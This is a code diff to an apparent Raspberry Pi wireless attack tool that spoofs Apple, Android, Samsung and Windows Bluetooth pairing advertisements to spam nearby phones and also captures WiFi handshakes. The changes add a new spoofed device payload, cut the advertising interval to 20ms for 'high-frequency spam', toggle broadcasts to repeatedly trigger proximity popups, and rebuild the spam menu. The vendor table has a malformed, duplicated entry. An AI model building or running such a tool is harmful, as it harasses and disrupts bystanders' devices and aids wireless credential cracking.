@@ -36,7 +36,7 @@ os.makedirs(LOG_DIR, exist_ok=True)
 HANDSHAKE_FILE = os.path.join(LOG_DIR, "handshakes.pcap")
 PROBE_LOG = os.path.join(LOG_DIR, "probes.log")
 
-# --- OUI Lookup (Expanded) ---
+# --- OUI Lookup (Expanded common vendors) ---
 VENDORS = {
     "00:03:93": "Apple", "00:05:02": "Apple", "00:0A:27": "Apple", "00:0A:95": "Apple",
     "00:10:FA": "Apple", "00:11:24": "Apple", "00:14:51": "Apple", "00:16:CB": "Apple",
@@ -50,8 +50,42 @@ VENDORS = {
     "00:12:FB": "Samsung", "00:00:F0": "Samsung", "AC:5F:3E": "Samsung", "24:F5:AA": "Samsung",
     "38:2D:E8": "Samsung", "48:5A:3F": "Samsung", "50:85:69": "Samsung", "60:AF:6D": "Samsung",
     "00:13:E8": "Intel", "00:19:D1": "Intel", "00:1B:21": "Intel", "00:1C:BF": "Intel",
-    "00:14:22": "Dell", "00:15:C5": "Dell", "00:17:08": "HP", "00:18:71": "HP",
-    "00:0C:41": "Linksys", "00:09:5B": "Netgear", "00:14:D1": "TP-Link", "00:0D:0B": "Sony"
+    "00:1E:64": "Intel", "00:21:5C": "Intel", "00:21:6A": "Intel", "00:23:14": "Intel",
+    "D0:50:99": "ASRock", "BC:5F:F4": "ASRock", "00:25:9C": "Cisco", "00:26:0B": "Cisco",
+    "00:26:51": "Cisco", "00:26:98": "Cisco", "00:14:22": "Dell", "00:15:C5": "Dell",
+    "00:18:8B": "Dell", "00:1A:A0": "Dell", "00:1D:09": "Dell", "00:21:70": "Dell",
+    "00:23:AE": "Dell", "00:25:64": "Dell", "00:17:08": "HP", "00:18:71": "HP",
+    "00:1A:4B": "HP", "00:1B:78": "HP", "00:1E:0B": "HP", "00:21:5A": "HP",
+    "00:22:64": "HP", "00:23:47": "HP", "00:24:81": "HP", "00:25:B3": "HP",
+    "00:26:55": "HP", "00:04:23": "Intel", "00:0C:F1": "Intel", "00:13:02": "Intel",
+    "00:15:00": "Intel", "00:16:6F": "Intel", "00:16:EA": "Intel", "00:18:DE": "Intel",
+    "00:19:70": "Intel", "00:1A:11": "Intel", "00:1B:77": "Intel", "00:1C:23": "Intel",
+    "00:1D:E0": "Intel", "00:1E:65": "Intel", "00:21:5D": "Intel", "00:22:FA": "Intel",
+    "00:24:D6": "Intel", "00:24:D7": "Intel", "00:27:0E": "Intel", "00:27:10": "Intel",
+    "00:0B:AD": "Microsoft", "00:12:5A": "Microsoft", "00:15:5D": "Microsoft",
+    "00:17:FA": "Microsoft", "00:1D:D8": "Microsoft", "00:22:48": "Microsoft",
+    "00:25:22": "Microsoft", "00:03:7F": "Atheros", "00:08:E3": "Atheros",
+    "00:13:74": "Atheros", "00:1B:B1": "Atheros", "00:03:2F": "GlobalTop",
+    "00:0E:8E": "ASUS", "00:11:D8": "ASUS", "00:15:AF": "ASUS", "00:17:31": "ASUS",
+    "00:18:F3": "ASUS", "00:1B:FC": "ASUS", "00:1E:8C": "ASUS", "00:23:54": "ASUS",
+    "00:24:8C": "ASUS", "00:26:18": "ASUS", "00:0C:41": "Linksys", "00:0F:66": "Linksys",
+    "00:13:10": "Linksys", "00:14:BF": "Linksys", "00:18:39": "Linksys", "00:1D:7E": "Linksys",
+    "00:21:29": "Linksys", "00:22:6B": "Linksys", "00:23:69": "Linksys", "00:25:9C": "Linksys",
+    "00:09:5B": "Netgear", "00:0F:B5": "Netgear", "00:14:6C": "Netgear", "00:18:4D": "Netgear",
+    "00:1B:2F": "Netgear", "00:1E:2A": "Netgear", "00:1F:33": "Netgear", "00:22:3F": "Netgear",
+    "00:24:B2": "Netgear", "00:26:F2": "Netgear", "00:14:D1": "TP-Link", "00:19:E0": "TP-Link",
+    "00:21:27": "TP-Link", "00:23:CD": "TP-Link", "00:25:86": "TP-Link", "00:27:19": "TP-Link",
+    "10:FE:ED": "TP-Link", "14:CC:20": "TP-Link", "18:A6:F7": "TP-Link", "30:B5:C2": "TP-Link",
+    "00:0D:0B": "Sony", "00:13:15": "Sony", "00:13:A9": "Sony", "00:15:C1": "Sony",
+    "00:19:C5": "Sony", "00:1B:D7": "Sony", "00:1D:BA": "Sony", "00:1E:45": "Sony",
+    "00:1F:A7": "Sony", "00:24:33": "Sony", "00:24:C3": "Sony", "00:25:4E": "Sony",
+    "00:02:C1": "Ericsson", "00:0AD:D9": "Ericsson", "00:12:F0": "Ericsson",
+    "00:15:E1": "Ericsson", "00:16:20": "Ericsson", "00:18:13": "Ericsson",
+    "00:19:63": "Ericsson", "00:1B:66": "Ericsson", "00:1E:A6": "Ericsson",
+    "00:21:0E": "Ericsson", "00:24:9F": "Ericsson", "00:25:B5": "Ericsson",
+    "00:04:4B": "NVIDIA", "00:09:5B": "NVIDIA", "00:1E:8C": "ASUS", "00:1B:11": "D-Link",
+    "00:1C:F0": "D-Link", "00:1E:58": "D-Link", "00:21:91": "D-Link", "00:22:B0": "D-Link",
+    "00:24:01": "D-Link", "00:26:5A": "D-Link", "00:0B:86": "Aruba", "00:1A:1E": "Aruba"
 }
 
 def get_vendor(mac):
@@ -76,6 +110,7 @@ APPLE_DEVICES = {
     "AirPods": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
     "AirPods Pro": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
     "AirPods Max": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
+    "Beats Solo Pro": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0C, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
     "AppleTV Setup": [0x1E, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
     "AirTag / Find My": [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
 }
@@ -87,6 +122,52 @@ ALL_BLE_PAYLOADS = list(APPLE_DEVICES.values()) + [ANDROID_FAST, SAMSUNG_QUICK, 
 # --- WiFi Data ---
 COMMON_SSIDS = ["Free Public WiFi", "Starbucks WiFi", "Xfinitywifi", "eduroam", "Guest WiFi", "FBI Surveillance Van #4", "Loading...", "Searching..."]
 RANDOM_NAMES = ["Dave's iPhone", "Sarah's Laptop", "Office Printer", "Smart TV", "Home Hub", "Kitchen_Light", "Tesla_Model_3", "Ring_Doorbell"]
+
+# --- Device Detection ---
+def get_hci_devices():
+    devices = []
+    try:
+        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
+        for line in result.stdout.split('\n'):
+            if line.startswith('hci'):
+                devices.append({'id': line.split(':')[0], 'manufacturer': 'Unknown'})
+        detailed = subprocess.run(['hciconfig', '-a'], capture_output=True, text=True)
+        current_dev = None
+        for line in detailed.stdout.split('\n'):
+            line = line.strip()
+            if line.startswith('hci'):
+                current_dev = line.split(':')[0]
+            elif 'Manufacturer:' in line and current_dev:
+                mfr = line.split('Manufacturer:')[1].strip()
+                for dev in devices:
+                    if dev['id'] == current_dev:
+                        dev['manufacturer'] = mfr
+    except:
+        pass
+    return devices
+
+def get_wifi_devices():
+    interfaces = []
+    try:
+        with open('/proc/net/dev', 'r') as f:
+            for line in f.readlines()[2:]:
+                if ':' in line:
+                    ifname = line.split(':')[0].strip()
+                    if any(ifname.startswith(p) for p in ['wlan', 'wl', 'wlp']):
+                        interfaces.append({'id': ifname, 'manufacturer': 'Unknown'})
+        try:
+            result = subprocess.run(['airmon-ng'], capture_output=True, text=True)
+            for i, dev in enumerate(interfaces):
+                for line in result.stdout.split('\n'):
+                    if dev['id'] in line:
+                        parts = [p for p in line.split(' ') if p]
+                        if len(parts) >= 3:
+                            interfaces[i]['manufacturer'] = " ".join(parts[2:])
+        except:
+            pass
+    except:
+        pass
+    return interfaces
 
 # --- Classes ---
 class BLEDevice:
@@ -247,7 +328,8 @@ class PiBLESpan:
         return self.run_hcitool(0x08, 0x000A, [1 if enable else 0])
 
     def set_adv_params(self):
-        return self.run_hcitool(0x08, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
+        # Minimum advertising interval (20ms) for high-frequency spam
+        return self.run_hcitool(0x08, 0x0006, [0x20, 0x00, 0x20, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
 
     def set_adv_data(self, data):
         payload = [len(data)] + data + [0] * (31 - len(data))
@@ -258,6 +340,7 @@ class PiBLESpan:
         self.set_adv_params()
         if not cycle:
             self.set_adv_data(payload)
+        
         while self.is_running:
             if cycle:
                 for p in ALL_BLE_PAYLOADS:
@@ -265,11 +348,14 @@ class PiBLESpan:
                         break
                     self.set_adv_data(p)
                     self.set_adv_enable(True)
-                    time.sleep(0.5)
+                    time.sleep(0.5) # Dynamic rotation
                     self.set_adv_enable(False)
             else:
+                # Toggle advertising to trigger proximity logic repeatedly
                 self.set_adv_enable(True)
-                time.sleep(1)
+                time.sleep(0.5)
+                self.set_adv_enable(False)
+                time.sleep(0.1)
 
     def scan_task(self):
         subprocess.run(['hciconfig', self.hci_interface, 'up'], capture_output=True)
@@ -494,20 +580,31 @@ def main():
                         print(f"[🚀] HANDSHAKE CAPTURED for {target_ap.ssid}!")
                         target_ap.handshake = False
             elif choice == '3' and ble:
-                print("\n1. Cycle All | 2. AirPods | 3. Android | 4. Samsung | 5. Windows | 6. AirTag")
-                bc = input("Choice: ")
-                if bc == '1':
+                print("\n--- Apple Proximity ---")
+                apple_list = list(APPLE_DEVICES.keys())
+                for i, name in enumerate(apple_list):
+                    print(f"{i+1}. {name}")
+                print(f"{len(apple_list)+1}. CYCLE ALL (Apple, Android, Samsung, Windows)")
+                
+                print("\n--- Others ---")
+                print(f"{len(apple_list)+2}. Android Fast Pair")
+                print(f"{len(apple_list)+3}. Samsung Quick Pair")
+                print(f"{len(apple_list)+4}. Windows Swift Pair")
+                
+                bc = int(input("\nChoice: "))
+                
+                if bc <= len(apple_list):
+                    ble.start_spam(payload=APPLE_DEVICES[apple_list[bc-1]])
+                elif bc == len(apple_list) + 1:
                     ble.start_spam(cycle=True)
-                elif bc == '2':
-                    ble.start_spam(APPLE_DEVICES["AirPods Pro"])
-                elif bc == '3':
-                    ble.start_spam(ANDROID_FAST)
-                elif bc == '4':
-                    ble.start_spam(SAMSUNG_QUICK)
-                elif bc == '5':
-                    ble.start_spam(MICROSOFT_SWIFT)
-                elif bc == '6':
-                    ble.start_spam(APPLE_DEVICES["AirTag / Find My"])
+                elif bc == len(apple_list) + 2:
+                    ble.start_spam(payload=ANDROID_FAST)
+                elif bc == len(apple_list) + 3:
+                    ble.start_spam(payload=SAMSUNG_QUICK)
+                elif bc == len(apple_list) + 4:
+                    ble.start_spam(payload=MICROSOFT_SWIFT)
+                
+                print("\n[*] BLE Spamming Active. Ctrl+C to stop.")
                 while True:
                     time.sleep(1)
             elif choice == '4' and wifi:
